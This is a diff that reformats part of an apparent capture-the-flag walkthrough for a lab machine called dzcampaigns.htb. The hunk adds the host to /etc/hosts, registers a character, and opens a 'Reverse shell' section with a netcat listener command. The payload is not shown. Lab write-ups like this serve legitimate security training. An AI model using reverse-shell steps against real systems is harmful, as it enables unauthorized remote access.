@@ -72,11 +72,9 @@ echo "TARGET_IP dzcampaigns.htb" | sudo tee -a /etc/hosts
 
 Then at `http://dzcampaigns.htb/register`, create a character; note the character ID from the edit URL (`/character/<ID>/edit`). Below assumes ID 15.
 
-### Reverse shell.
+### Reverse shell
 
-** Start a listener on Kali:
-
-bash
+Start a listener on Kali:
 
 ```bash
 nc -lvnp 4444
